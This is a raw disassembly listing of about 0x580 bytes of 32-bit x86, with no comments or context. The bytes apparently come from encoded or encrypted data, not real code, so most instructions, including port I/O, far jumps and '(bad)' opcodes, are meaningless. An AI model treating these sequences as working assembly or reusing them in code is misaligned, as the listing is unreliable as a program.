  409dfe:	a0 60 a0 82 a0       	mov    0xa082a060,%al
  409e03:	60                   	pusha
  409e04:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  409e09:	81 a0 60 a0 d6 05 93 	andl   $0xedcef893,0x5d6a060(%eax)
  409e10:	f8 ce ed 
  409e13:	94                   	xchg   %eax,%esp
  409e14:	f7 95 f6 d6 e1 d8    	notl   -0x271e290a(%ebp)
  409e1a:	e1 d8                	loope  0x409df4
  409e1c:	f5                   	cmc
  409e1d:	ca 06 8f             	lret   $0x8f06
  409e20:	ea ac e3 af d3 a5 14 	ljmp   $0x14a5,$0xd3afe3ac
  409e27:	90                   	nop
  409e28:	eb b1                	jmp    0x409ddb
  409e2a:	f2 d6                	repnz salc
  409e2c:	e4 b2                	in     $0xb2,%al
  409e2e:	a0 60 a0 5f 9f       	mov    0x9f5fa060,%al
  409e33:	5f                   	pop    %edi
  409e34:	9f                   	lahf
  409e35:	85 a0 60 a0 c8 04    	test   %esp,0x4c8a060(%eax)
  409e3b:	95                   	xchg   %eax,%ebp
  409e3c:	0d 97 ed 95 08       	or     $0x895ed97,%eax
  409e41:	cf                   	iret
  409e42:	f1                   	int1
  409e43:	b6 f4                	mov    $0xf4,%dh
  409e45:	c3                   	ret
  409e46:	10 b0 1a c4 e1 d8    	adc    %dh,-0x271e3be6(%eax)
  409e4c:	d4 94                	aam    $0x94
  409e4e:	12 c2                	adc    %dl,%al
  409e50:	e5 ab                	in     $0xab,%eax
  409e52:	ef                   	out    %eax,(%dx)
  409e53:	d1 e4                	shl    $1,%esp
  409e55:	b9 e4 97 d6 cf       	mov    $0xcfd697e4,%ecx
  409e5a:	d5 b9                	aad    $0xb9
  409e5c:	e3 b2                	jecxz  0x409e10
  409e5e:	a0 60 a0 5f 9f       	mov    0x9f5fa060,%al
  409e63:	5f                   	pop    %edi
  409e64:	9f                   	lahf
  409e65:	78 a0                	js     0x409e07
  409e67:	60                   	pusha
  409e68:	a0 b5 f8 b2 d1       	mov    0xd1b2f8b5,%al
  409e6d:	b7 d7                	mov    $0xd7,%bh
  409e6f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  409e70:	18 b9 d1 da e5 b7    	sbb    %bh,-0x481a252f(%ecx)
  409e76:	ef                   	out    %eax,(%dx)
  409e77:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409e78:	d4 c7                	aam    $0xc7
  409e7a:	e6 c4                	out    %al,$0xc4
  409e7c:	f5                   	cmc
  409e7d:	d9 0e                	(bad) (%esi)
  409e7f:	8f                   	(bad)
  409e80:	f0 60                	lock pusha
  409e82:	a0 60 a0 5f 9f       	mov    0x9f5fa060,%al
  409e87:	5f                   	pop    %edi
  409e88:	9f                   	lahf
  409e89:	73 a0                	jae    0x409e2b
  409e8b:	60                   	pusha
  409e8c:	a0 93 e2 d8 0b       	mov    0xbd8e293,%al
  409e91:	d3 e3                	shl    %cl,%ebx
  409e93:	b3 ed                	mov    $0xed,%bl
  409e95:	cb                   	lret
  409e96:	14 c2                	adc    $0xc2,%al
  409e98:	d2 d6                	rcl    %cl,%dh
  409e9a:	05 d3 e8 ce 13       	add    $0x13cee8d3,%eax
  409e9f:	b0 a0                	mov    $0xa0,%al
  409ea1:	b5 2b                	mov    $0x2b,%ch
  409ea3:	4c                   	dec    %esp
  409ea4:	59                   	pop    %ecx
  409ea5:	70 a0                	jo     0x409e47
  409ea7:	60                   	pusha
  409ea8:	a0 ca a0 ca a0       	mov    0xa0caa0ca,%al
  409ead:	a9 15 59 f1 b3       	test   $0xb3f15915,%eax
  409eb2:	f6 b7 d3 20 f5 c8    	divb   -0x370adf2d(%edi)
  409eb8:	3d ed e0 60 04       	cmp    $0x460e0ed,%eax
  409ebd:	5f                   	pop    %edi
  409ebe:	d0 c4                	rol    $1,%ah
  409ec0:	29 80 66 a5 9f 60    	sub    %eax,0x609fa566(%eax)
  409ec6:	d3 20                	shll   %cl,(%eax)
  409ec8:	f5                   	cmc
  409ec9:	c8 d8 ed e0          	enter  $0xedd8,$0xe0
  409ecd:	60                   	pusha
  409ece:	04 5f                	add    $0x5f,%al
  409ed0:	d0 c4                	rol    $1,%ah
  409ed2:	29 80 20 dd a8 60    	sub    %eax,0x60a8dd20(%eax)
  409ed8:	16                   	push   %ss
  409ed9:	6a 88                	push   $0xffffff88
  409edb:	6a 98                	push   $0xffffff98
  409edd:	5f                   	pop    %edi
  409ede:	9f                   	lahf
  409edf:	48                   	dec    %eax
  409ee0:	01 5b 9f             	add    %ebx,-0x61(%ebx)
  409ee3:	5f                   	pop    %edi
  409ee4:	88 e4                	mov    %ah,%ah
  409ee6:	73 5f                	jae    0x409f47
  409ee8:	9f                   	lahf
  409ee9:	e4 60                	in     $0x60,%al
  409eeb:	d4 dc                	aam    $0xdc
  409eed:	ed                   	in     (%dx),%eax
  409eee:	ed                   	in     (%dx),%eax
  409eef:	58                   	pop    %eax
  409ef0:	d3 32                	shll   %cl,(%edx)
  409ef2:	58                   	pop    %eax
  409ef3:	18 2d a0 a0 48 a9    	sbb    %ch,0xa948a0a0
  409ef9:	1d 9f 5f 2b a5       	sbb    $0xa52b5f9f,%eax
  409efe:	98                   	cwtl
  409eff:	b0 2d                	mov    $0x2d,%al
  409f01:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409f02:	94                   	xchg   %eax,%esp
  409f03:	48                   	dec    %eax
  409f04:	ed                   	in     (%dx),%eax
  409f05:	34 9f                	xor    $0x9f,%al
  409f07:	5f                   	pop    %edi
  409f08:	2b b5 94 b8 88 24    	sub    0x2488b894(%ebp),%esi
  409f0e:	3e 5f                	ds pop %edi
  409f10:	9f                   	lahf
  409f11:	e5 60                	in     $0x60,%eax
  409f13:	d4 b4                	aam    $0xb4
  409f15:	48                   	dec    %eax
  409f16:	b7 0a                	mov    $0xa,%bh
  409f18:	9f                   	lahf
  409f19:	5f                   	pop    %edi
  409f1a:	06                   	push   %es
  409f1b:	9d                   	popf
  409f1c:	b6 64                	mov    $0x64,%dh
  409f1e:	15 69 88 f0 96       	adc    $0x96f08869,%eax
  409f23:	5f                   	pop    %edi
  409f24:	9f                   	lahf
  409f25:	e4 60                	in     $0x60,%al
  409f27:	d4 ba                	aam    $0xba
  409f29:	e0 1d                	loopne 0x409f48
  409f2b:	68 a0 d5 a7 48       	push   $0x48a7d5a0
  409f30:	ed                   	in     (%dx),%eax
  409f31:	5c                   	pop    %esp
  409f32:	9f                   	lahf
  409f33:	5f                   	pop    %edi
  409f34:	8b 6d 0a             	mov    0xa(%ebp),%ebp
  409f37:	60                   	pusha
  409f38:	88 24 49             	mov    %ah,(%ecx,%ecx,2)
  409f3b:	5f                   	pop    %edi
  409f3c:	9f                   	lahf
  409f3d:	b0 88                	mov    $0x88,%al
  409f3f:	7e 4a                	jle    0x409f8b
  409f41:	5f                   	pop    %edi
  409f42:	9f                   	lahf
  409f43:	e0 1d                	loopne 0x409f62
  409f45:	68 a0 6f 25 b7       	push   $0xb7256fa0
  409f4a:	a1 60 a0 ed f5       	mov    0xf5eda060,%eax
  409f4f:	50                   	push   %eax
  409f50:	58                   	pop    %eax
  409f51:	61                   	popa
  409f52:	a0 60 a0 48 87       	mov    0x8748a060,%al
  409f57:	e9 9f 5f 2b a5       	jmp    0xa56bfefb
  409f5c:	90                   	nop
  409f5d:	b0 2d                	mov    $0x2d,%al
  409f5f:	ad                   	lods   %ds:(%esi),%eax
  409f60:	8c 93 72 18 80 ed    	mov    %ss,-0x127fe78e(%ebx)
  409f66:	e0 60                	loopne 0x409fc8
  409f68:	88 f8                	mov    %bh,%al
  409f6a:	5c                   	pop    %esp
  409f6b:	5f                   	pop    %edi
  409f6c:	9f                   	lahf
  409f6d:	eb f5                	jmp    0x409f64
  409f6f:	4c                   	dec    %esp
  409f70:	f8                   	clc
  409f71:	48                   	dec    %eax
  409f72:	67 fc                	addr16 cld
  409f74:	9f                   	lahf
  409f75:	5f                   	pop    %edi
  409f76:	af                   	scas   %es:(%edi),%eax
  409f77:	e4 90                	in     $0x90,%al
  409f79:	60                   	pusha
  409f7a:	a0 60 88 d4 95       	mov    0x95d48860,%al
  409f7f:	5f                   	pop    %edi
  409f80:	9f                   	lahf
  409f81:	e4 60                	in     $0x60,%al
  409f83:	d4 a5                	aam    $0xa5
  409f85:	48                   	dec    %eax
  409f86:	97                   	xchg   %eax,%edi
  409f87:	5b                   	pop    %ebx
  409f88:	9f                   	lahf
  409f89:	5f                   	pop    %edi
  409f8a:	88 72 2a             	mov    %dh,0x2a(%edx)
  409f8d:	5f                   	pop    %edi
  409f8e:	9f                   	lahf
  409f8f:	ed                   	in     (%dx),%eax
  409f90:	e5 48                	in     $0x48,%eax
  409f92:	88 b2 79 5f 9f 5f    	mov    %dh,0x5f9f5f79(%edx)
  409f98:	15 48 58 63 a0       	adc    $0xa0635848,%eax
  409f9d:	60                   	pusha
  409f9e:	a0 48 a1 ef 9f       	mov    0x9fefa148,%al
  409fa3:	5f                   	pop    %edi
  409fa4:	23 20                	and    (%eax),%esp
  409fa6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  409fa7:	ed                   	in     (%dx),%eax
  409fa8:	f5                   	cmc
  409fa9:	44                   	inc    %esp
  409faa:	88 ca                	mov    %cl,%dl
  409fac:	54                   	push   %esp
  409fad:	5f                   	pop    %edi
  409fae:	9f                   	lahf
  409faf:	5f                   	pop    %edi
  409fb0:	15 44 2d ad 80       	adc    $0x80ad2d44,%eax
  409fb5:	93                   	xchg   %eax,%ebx
  409fb6:	72 18                	jb     0x409fd0
  409fb8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  409fb9:	ee                   	out    %al,(%dx)
  409fba:	e0 60                	loopne 0x40a01c
  409fbc:	88 a4 5c 5f 9f 5f 15 	mov    %ah,0x155f9f5f(%esp,%ebx,2)
  409fc3:	40                   	inc    %eax
  409fc4:	58                   	pop    %eax
  409fc5:	c4                   	(bad)
  409fc6:	c8 a1 a0 1a          	enter  $0xa0a1,$0x1a
  409fca:	a3 60 a0 60 88       	mov    %eax,0x8860a060
  409fcf:	46                   	inc    %esi
  409fd0:	3b 5f 9f             	cmp    -0x61(%edi),%ebx
  409fd3:	01 04 88             	add    %eax,(%eax,%ecx,4)
  409fd6:	e1 60                	loope  0x40a038
  409fd8:	f0 ed                	lock in (%dx),%eax
  409fda:	f5                   	cmc
  409fdb:	38 d3                	cmp    %dl,%bl
  409fdd:	20 88 be 29 5f 9f    	and    %cl,-0x60a0d642(%eax)
  409fe3:	eb e5                	jmp    0x409fca
  409fe5:	38 2d b5 7c 48 b7    	cmp    %ch,0xb7487cb5
  409feb:	2c 9f                	sub    $0x9f,%al
  409fed:	5f                   	pop    %edi
  409fee:	2b a5 7c b0 88 32    	sub    0x3288b07c(%ebp),%esp
  409ff4:	6c                   	insb   (%dx),%es:(%edi)
  409ff5:	5f                   	pop    %edi
  409ff6:	9f                   	lahf
  409ff7:	e4 60                	in     $0x60,%al
  409ff9:	6f                   	outsl  %ds:(%esi),(%dx)
  409ffa:	24 05                	and    $0x5,%al
  409ffc:	a0 60 a0 ca a0       	mov    0xa0caa060,%al
  40a001:	ca a0 ed             	lret   $0xeda0
  40a004:	ed                   	in     (%dx),%eax
  40a005:	30 d3                	xor    %dl,%bl
  40a007:	32 58 84             	xor    -0x7c(%eax),%bl
  40a00a:	2e a0 a0 48 93 1b    	mov    %cs:0x1b9348a0,%al
  40a010:	9f                   	lahf
  40a011:	5f                   	pop    %edi
  40a012:	9f                   	lahf
  40a013:	d5 70                	aad    $0x70
  40a015:	5f                   	pop    %edi
  40a016:	d5 c4                	aad    $0xc4
  40a018:	c8 a1 a0 ed          	enter  $0xa0a1,$0xed
  40a01c:	ed                   	in     (%dx),%eax
  40a01d:	2c d3                	sub    $0xd3,%al
  40a01f:	32 58 a0             	xor    -0x60(%eax),%bl
  40a022:	2e a0 a0 48 7b 1b    	mov    %cs:0x1b7b48a0,%al
  40a028:	9f                   	lahf
  40a029:	5f                   	pop    %edi
  40a02a:	9f                   	lahf
  40a02b:	d5 6c                	aad    $0x6c
  40a02d:	ed                   	in     (%dx),%eax
  40a02e:	f5                   	cmc
  40a02f:	28 d3                	sub    %dl,%bl
  40a031:	20 88 6a 29 5f 9f    	and    %cl,-0x60a0d696(%eax)
  40a037:	5f                   	pop    %edi
  40a038:	15 28 2d ad 64       	adc    $0x64ad2d28,%eax
  40a03d:	93                   	xchg   %eax,%ebx
  40a03e:	72 18                	jb     0x40a058
  40a040:	08 ee                	or     %ch,%dh
  40a042:	e0 60                	loopne 0x40a0a4
  40a044:	88 1c 5b             	mov    %bl,(%ebx,%ebx,2)
  40a047:	5f                   	pop    %edi
  40a048:	9f                   	lahf
  40a049:	5f                   	pop    %edi
  40a04a:	15 24 2d a5 74       	adc    $0x74a52d24,%eax
  40a04f:	1a a5 60 a0 60 88    	sbb    -0x779f5fa0(%ebp),%ah
  40a055:	c0 3b 5f             	sarb   $0x5f,(%ebx)
  40a058:	9f                   	lahf
  40a059:	eb e5                	jmp    0x40a040
  40a05b:	34 d3                	xor    $0xd3,%al
  40a05d:	29 d3                	sub    %edx,%ebx
  40a05f:	32 88 5c 65 5f 9f    	xor    -0x60a09aa4(%eax),%cl
  40a065:	48                   	dec    %eax
  40a066:	b7 5b                	mov    $0x5b,%bh
  40a068:	9f                   	lahf
  40a069:	5f                   	pop    %edi
  40a06a:	8b 98 2d b5 60 18    	mov    0x1860b52d(%eax),%ebx
  40a070:	a2 60 a0 60 88       	mov    %al,0x8860a060
  40a075:	28 28                	sub    %ch,(%eax)
  40a077:	5f                   	pop    %edi
  40a078:	9f                   	lahf
  40a079:	eb e5                	jmp    0x40a060
  40a07b:	20 88 f4 64 5f 9f    	and    %cl,-0x60a09b0c(%eax)
  40a081:	e4 60                	in     $0x60,%al
  40a083:	d4 bf                	aam    $0xbf
  40a085:	c8 94 61 a0          	enter  $0x6194,$0xa0
  40a089:	60                   	pusha
  40a08a:	88 2a                	mov    %ch,(%edx)
  40a08c:	48                   	dec    %eax
  40a08d:	5f                   	pop    %edi
  40a08e:	9f                   	lahf
  40a08f:	ed                   	in     (%dx),%eax
  40a090:	f5                   	cmc
  40a091:	1c 58                	sbb    $0x58,%al
  40a093:	62 a0 60 a0 48 45    	bound  %esp,0x4548a060(%eax)
  40a099:	e8 9f 5f 2b a5       	call   0xa56c003d
  40a09e:	5c                   	pop    %esp
  40a09f:	48                   	dec    %eax
  40a0a0:	85 24 9f             	test   %esp,(%edi,%ebx,4)
  40a0a3:	5f                   	pop    %edi
  40a0a4:	88 ac 94 5f 9f ed e5 	mov    %ch,-0x1a1260a1(%esp,%edx,4)
  40a0ab:	18 88 38 89 5f 9f    	sbb    %cl,-0x60a076c8(%eax)
  40a0b1:	eb f5                	jmp    0x40a0a8
  40a0b3:	18 58 b8             	sbb    %bl,-0x48(%eax)
  40a0b6:	c8 a1 a0 48          	enter  $0xa0a1,$0x48
  40a0ba:	af                   	scas   %es:(%edi),%eax
  40a0bb:	f9                   	stc
  40a0bc:	9f                   	lahf
  40a0bd:	5f                   	pop    %edi
  40a0be:	23 9d f8 88 e1 60    	and    0x60e188f8(%ebp),%ebx
  40a0c4:	a0 d4 c0 ed f5       	mov    0xf5edc0d4,%al
  40a0c9:	0c 41                	or     $0x41,%al
  40a0cb:	b8 c8 a1 a0 48       	mov    $0x48a0a1c8,%eax
  40a0d0:	71 4d                	jno    0x40a11f
  40a0d2:	9f                   	lahf
  40a0d3:	5f                   	pop    %edi
  40a0d4:	2d b5 4c 18 ec       	sub    $0xec184cb5,%eax
  40a0d9:	88 e1                	mov    %ah,%cl
  40a0db:	60                   	pusha
  40a0dc:	2b 6d 74             	sub    0x74(%ebp),%ebp
  40a0df:	cf                   	iret
  40a0e0:	e0 60                	loopne 0x40a142
  40a0e2:	88 26                	mov    %ah,(%esi)
  40a0e4:	3f                   	aas
  40a0e5:	5f                   	pop    %edi
  40a0e6:	9f                   	lahf
  40a0e7:	e1 dd                	loope  0x40a0c6
  40a0e9:	ac                   	lods   %ds:(%esi),%al
  40a0ea:	c8 a1 a0 60          	enter  $0xa0a1,$0x60
  40a0ee:	a0 5f 9f 6f 25       	mov    0x256f9f5f,%al
  40a0f3:	20 a0 60 a0 ed ed    	and    %ah,-0x12125fa0(%eax)
  40a0f9:	ec                   	in     (%dx),%al
  40a0fa:	58                   	pop    %eax
  40a0fb:	ac                   	lods   %ds:(%esi),%al
  40a0fc:	c8 a1 a0 1a          	enter  $0xa0a1,$0x1a
  40a100:	a1 60 9f 5f 88       	mov    0x885f9f60,%eax
  40a105:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a106:	86 5f 9f             	xchg   %bl,-0x61(%edi)
  40a109:	ed                   	in     (%dx),%eax
  40a10a:	f5                   	cmc
  40a10b:	ec                   	in     (%dx),%al
  40a10c:	2d ad 48 01 f8       	sub    $0xf80148ad,%eax
  40a111:	88 e1                	mov    %ah,%cl
  40a113:	60                   	pusha
  40a114:	88 30                	mov    %dh,(%eax)
  40a116:	86 5f 9f             	xchg   %bl,-0x61(%edi)
  40a119:	eb f5                	jmp    0x40a110
  40a11b:	08 58 bc             	or     %bl,-0x44(%eax)
  40a11e:	c8 a1 a0 48          	enter  $0xa0a1,$0x48
  40a122:	47                   	inc    %edi
  40a123:	f8                   	clc
  40a124:	9f                   	lahf
  40a125:	5f                   	pop    %edi
  40a126:	23 9d fc 88 e1 60    	and    0x60e188fc(%ebp),%ebx
  40a12c:	a0 6f 24 e4 a0       	mov    0xa0e4246f,%al
  40a131:	60                   	pusha
  40a132:	a0 ed e5 e8 88       	mov    0x88e8e5ed,%al
  40a137:	6a 91                	push   $0xffffff91
  40a139:	5f                   	pop    %edi
  40a13a:	9f                   	lahf
  40a13b:	eb f5                	jmp    0x40a132
  40a13d:	e8 58 c0 c8 a1       	call   0xa209619a
  40a142:	a0 48 25 f8 9f       	mov    0x9ff82548,%al
  40a147:	5f                   	pop    %edi
  40a148:	23 9d 00 88 e1 60    	and    0x60e18800(%ebp),%ebx
  40a14e:	a0 d4 02 01 00       	mov    0x102d4,%al
  40a153:	88 e1                	mov    %ah,%cl
  40a155:	60                   	pusha
  40a156:	f0 01 fc             	lock add %edi,%esp
  40a159:	88 e1                	mov    %ah,%cl
  40a15b:	60                   	pusha
  40a15c:	f0 48                	lock dec %eax
  40a15e:	07                   	pop    %es
  40a15f:	2b 9f 5f 24 20 14    	sub    0x1420245f(%edi),%ebx
  40a165:	ad                   	lods   %ds:(%esi),%eax
  40a166:	0a 61 0a             	or     0xa(%ecx),%ah
  40a169:	60                   	pusha
  40a16a:	2d ad 20 93 72       	sub    $0x729320ad,%eax
  40a16f:	18 24 ee             	sbb    %ah,(%esi,%ebp,8)
  40a172:	e0 60                	loopne 0x40a1d4
  40a174:	88 ec                	mov    %ch,%ah
  40a176:	5a                   	pop    %edx
  40a177:	5f                   	pop    %edi
  40a178:	9f                   	lahf
  40a179:	5f                   	pop    %edi
  40a17a:	15 e0 9f 95 00       	adc    $0x959fe0,%eax
  40a17f:	88 e1                	mov    %ah,%cl
  40a181:	60                   	pusha
  40a182:	2d ed 1c 5f 9f       	sub    $0x9f5f1ced,%eax
  40a187:	5f                   	pop    %edi
  40a188:	d3 32                	shll   %cl,(%edx)
  40a18a:	58                   	pop    %eax
  40a18b:	18 2e                	sbb    %ch,(%esi)
  40a18d:	a0 a0 48 11 1a       	mov    0x1a1148a0,%al
  40a192:	9f                   	lahf
  40a193:	5f                   	pop    %edi
  40a194:	9f                   	lahf
  40a195:	15 1c 5f 9f 5f       	adc    $0x5f9f5f1c,%eax
  40a19a:	2d a5 24 1a a3       	sub    $0xa31a24a5,%eax
  40a19f:	60                   	pusha
  40a1a0:	a0 60 88 72 3a       	mov    0x3a728860,%al
  40a1a5:	5f                   	pop    %edi
  40a1a6:	9f                   	lahf
  40a1a7:	eb e5                	jmp    0x40a18e
  40a1a9:	e4 d3                	in     $0xd3,%al
  40a1ab:	29 d3                	sub    %edx,%ebx
  40a1ad:	32 88 0e 64 5f 9f    	xor    -0x60a09bf2(%eax),%cl
  40a1b3:	26 e5 5f             	es in  $0x5f,%eax
  40a1b6:	a1 93 60 ba f9       	mov    0xf9ba6093,%eax
  40a1bb:	b9 04 e9 b0 4b       	mov    $0x4bb0e904,%ecx
  40a1c0:	aa                   	stos   %al,%es:(%edi)
  40a1c1:	49                   	dec    %ecx
  40a1c2:	6b f1 9f             	imul   $0xffffff9f,%ecx,%esi
  40a1c5:	5f                   	pop    %edi
  40a1c6:	88 de                	mov    %bl,%dh
  40a1c8:	33 5f 9f             	xor    -0x61(%edi),%ebx
  40a1cb:	e0 1d                	loopne 0x40a1ea
  40a1cd:	68 a0 d5 a7 48       	push   $0x48a7d5a0
  40a1d2:	4b                   	dec    %ebx
  40a1d3:	59                   	pop    %ecx
  40a1d4:	9f                   	lahf
  40a1d5:	5f                   	pop    %edi
  40a1d6:	8b 6d 0a             	mov    0xa(%ebp),%ebp
  40a1d9:	60                   	pusha
  40a1da:	88 82 47 5f 9f b0    	mov    %al,-0x4f60a0b9(%edx)
  40a1e0:	88 dc                	mov    %bl,%ah
  40a1e2:	47                   	inc    %edi
  40a1e3:	5f                   	pop    %edi
  40a1e4:	9f                   	lahf
  40a1e5:	93                   	xchg   %eax,%ebx
  40a1e6:	60                   	pusha
  40a1e7:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  40a1ec:	b0 c8                	mov    $0xc8,%al
  40a1ee:	44                   	inc    %esp
  40a1ef:	ed                   	in     (%dx),%eax
  40a1f0:	e0 60                	loopne 0x40a252
  40a1f2:	2d e5 1c 5f 9f       	sub    $0x9f5f1ce5,%eax
  40a1f7:	5f                   	pop    %edi
  40a1f8:	5a                   	pop    %edx
  40a1f9:	64 a0 60 a0 48 3b    	mov    %fs:0x3b48a060,%al
  40a1ff:	f7 9f 5f 2d a5 48    	negl   0x48a52d5f(%edi)
  40a205:	48                   	dec    %eax
  40a206:	0f                   	maskmovq (bad),%mm3
  40a207:	f7 9f 5f 2d a5 4c    	negl   0x4ca52d5f(%edi)
  40a20d:	eb b5                	jmp    0x40a1c4
  40a20f:	34 0f                	xor    $0xf,%al
  40a211:	a0 a0 48 11 fd       	mov    0xfd1148a0,%al
  40a216:	9f                   	lahf
  40a217:	5f                   	pop    %edi
  40a218:	2d a5 58 1a b1       	sub    $0xb11a58a5,%eax
  40a21d:	60                   	pusha
  40a21e:	a0 60 88 d8 37       	mov    0x37d88860,%al
  40a223:	5f                   	pop    %edi
  40a224:	9f                   	lahf
  40a225:	23 89 f2 32 5f 9f    	and    -0x60a0cd0e(%ecx),%ecx
  40a22b:	4b                   	dec    %ebx
  40a22c:	65 ea e5 5f ff be fb 	gs ljmp $0xebfb,$0xbeff5fe5
  40a233:	eb 
  40a234:	85 bd 62 64 a0 5f    	test   %edi,0x5fa06462(%ebp)
  40a23a:	9f                   	lahf
  40a23b:	5f                   	pop    %edi
  40a23c:	9f                   	lahf
  40a23d:	7f a0                	jg     0x40a1df
  40a23f:	60                   	pusha
  40a240:	a0 92 e3 b6 14       	mov    0x14b6e392,%al
  40a245:	93                   	xchg   %eax,%ebx
  40a246:	d1 d8                	rcr    $1,%eax
  40a248:	0e                   	push   %cs
  40a249:	b5 f7                	mov    $0xf7,%ch
  40a24b:	c8 0d cd e3          	enter  $0xcd0d,$0xe3
  40a24f:	92                   	xchg   %eax,%edx
  40a250:	17                   	pop    %ss
  40a251:	c7                   	(bad)
  40a252:	e3 cc                	jecxz  0x40a220
  40a254:	d4 98                	aam    $0x98
  40a256:	f6 b4 f0 cc ee d2 e1 	divb   -0x1e2d1134(%eax,%esi,8)
  40a25d:	ae                   	scas   %es:(%edi),%al
  40a25e:	0e                   	push   %cs
  40a25f:	b0 a0                	mov    $0xa0,%al
  40a261:	5f                   	pop    %edi
  40a262:	9f                   	lahf
  40a263:	5f                   	pop    %edi
  40a264:	9f                   	lahf
  40a265:	78 a0                	js     0x40a207
  40a267:	60                   	pusha
  40a268:	a0 91 01 94 e8       	mov    0xe8940191,%al
  40a26d:	aa                   	stos   %al,%es:(%edi)
  40a26e:	d7                   	xlat   %ds:(%ebx)
  40a26f:	ac                   	lods   %ds:(%esi),%al
  40a270:	18 90 0d 95 08 96    	sbb    %dl,-0x69f76af3(%eax)
  40a276:	10 ac 07 c4 ec a9 06 	adc    %ch,0x6a9ecc4(%edi,%eax,1)
  40a27d:	ce                   	into
  40a27e:	ec                   	in     (%dx),%al
  40a27f:	b6 f0                	mov    $0xf0,%dh
  40a281:	60                   	pusha
  40a282:	a0 60 a0 5f 9f       	mov    0x9f5fa060,%al
  40a287:	5f                   	pop    %edi
  40a288:	9f                   	lahf
  40a289:	76 a0                	jbe    0x40a22b
  40a28b:	60                   	pusha
  40a28c:	a0 8f d6 b5 ec       	mov    0xecb5d68f,%al
  40a291:	d3 e1                	shl    %cl,%ecx
  40a293:	da 03                	fiaddl (%ebx)
  40a295:	b7 1a                	mov    $0x1a,%bh
  40a297:	98                   	cwtl
  40a298:	0e                   	push   %cs
  40a299:	d2 d7                	rcl    %cl,%bh
  40a29b:	b1 f8                	mov    $0xf8,%cl
  40a29d:	aa                   	stos   %al,%es:(%edi)
  40a29e:	cb                   	lret
  40a29f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40a2a0:	e7 a2                	out    %eax,$0xa2
  40a2a2:	ef                   	out    %eax,(%dx)
  40a2a3:	60                   	pusha
  40a2a4:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  40a2a9:	73 a0                	jae    0x40a24b
  40a2ab:	60                   	pusha
  40a2ac:	a0 cf e3 d8 f5       	mov    0xf5d8e3cf,%al
  40a2b1:	cd d8                	int    $0xd8
  40a2b3:	ba 0b c8 e2 d1       	mov    $0xd1e2c80b,%edx
  40a2b8:	0d c6 10 a1 d9       	or     $0xd9a110c6,%eax
  40a2bd:	a9 e3 b0 a0 5f       	test   $0x5fa0b0e3,%eax
  40a2c2:	9f                   	lahf
  40a2c3:	5f                   	pop    %edi
  40a2c4:	9f                   	lahf
  40a2c5:	7d a0                	jge    0x40a267
  40a2c7:	60                   	pusha
  40a2c8:	a0 d5 d9 96 02       	mov    0x296d9d5,%al
  40a2cd:	d4 f1                	aam    $0xf1
  40a2cf:	96                   	xchg   %eax,%esi
  40a2d0:	15 a9 01 8f f9       	adc    $0xf98f01a9,%eax
  40a2d5:	d8 f5                	fdiv   %st(5),%st
  40a2d7:	a1 1a d7 d4 98       	mov    0x98d4d71a,%eax
  40a2dc:	ef                   	out    %eax,(%dx)
  40a2dd:	ce                   	into
  40a2de:	f9                   	stc
  40a2df:	cf                   	iret
  40a2e0:	05 ae 0c a4 0a       	add    $0xaa40cae,%eax
  40a2e5:	b0 a0                	mov    $0xa0,%al
  40a2e7:	60                   	pusha
  40a2e8:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  40a2ed:	73 a0                	jae    0x40a28f
  40a2ef:	60                   	pusha
  40a2f0:	a0 d4 e2 d8 ed       	mov    0xedd8e2d4,%al
  40a2f5:	b6 03                	mov    $0x3,%dh
  40a2f7:	c1 f6 c3             	shl    $0xc3,%esi
  40a2fa:	f4                   	hlt
  40a2fb:	cc                   	int3
  40a2fc:	f3 ba f6 a9 0d aa    	repz mov $0xaa0da9f6,%edx
  40a302:	04 b0                	add    $0xb0,%al
  40a304:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  40a309:	8a a0 60 a0 ad 0f    	mov    0xfada060(%eax),%ah
  40a30f:	b4 f4                	mov    $0xf4,%ah
  40a311:	d5 15                	aad    $0x15
  40a313:	c4                   	(bad)
  40a314:	f9                   	stc
  40a315:	b2 d6                	mov    $0xd6,%dl
  40a317:	a1 f2 c9 04 b1       	mov    0xb104c9f2,%eax
  40a31c:	18 8b 0c cb 08 a8    	sbb    %cl,-0x57f734f4(%ebx)
  40a322:	e8 aa 18 b9 d8       	call   0xd8f9bbd1
  40a327:	b4 f1                	mov    $0xf1,%ah
  40a329:	c3                   	ret
  40a32a:	d5 c4                	aad    $0xc4
  40a32c:	10 ac d8 97 14 a7 16 	adc    %ch,0x16a71497(%eax,%ebx,8)
  40a333:	b9 d3 a2 f2 60       	mov    $0x60f2a2d3,%ecx
  40a338:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  40a33d:	72 a0                	jb     0x40a2df
  40a33f:	60                   	pusha
  40a340:	a0 95 e2 d8 d4       	mov    0xd4d8e295,%al
  40a345:	ab                   	stos   %eax,%es:(%edi)
  40a346:	0b b6 10 d4 0d d0    	or     -0x2ff22bf0(%esi),%esi
  40a34c:	07                   	pop    %es
  40a34d:	c7                   	(bad)
  40a34e:	e4 ab                	in     $0xab,%al
  40a350:	ee                   	out    %al,(%dx)
  40a351:	a8 ef                	test   $0xef,%al
  40a353:	60                   	pusha
  40a354:	a0 b5 2b 4c d3       	mov    0xd34c2bb5,%al
  40a359:	20 f5                	and    %dh,%ch
  40a35b:	c8 0a ef e0          	enter  $0xef0a,$0xe0
  40a35f:	60                   	pusha
  40a360:	04 5f                	add    $0x5f,%al
  40a362:	d0 c4                	rol    $1,%ah
  40a364:	29 80 58 d8 c8 a1    	sub    %eax,-0x5e3727a8(%eax)
  40a36a:	a0 48 a9 f6 9f       	mov    0x9ff6a948,%al
  40a36f:	5f                   	pop    %edi
  40a370:	58                   	pop    %eax
  40a371:	d4 c8                	aam    $0xc8
  40a373:	a1 a0 48 9f f5       	mov    0xf59f48a0,%eax
  40a378:	9f                   	lahf
  40a379:	5f                   	pop    %edi
  40a37a:	58                   	pop    %eax
  40a37b:	d0 c8                	ror    $1,%al
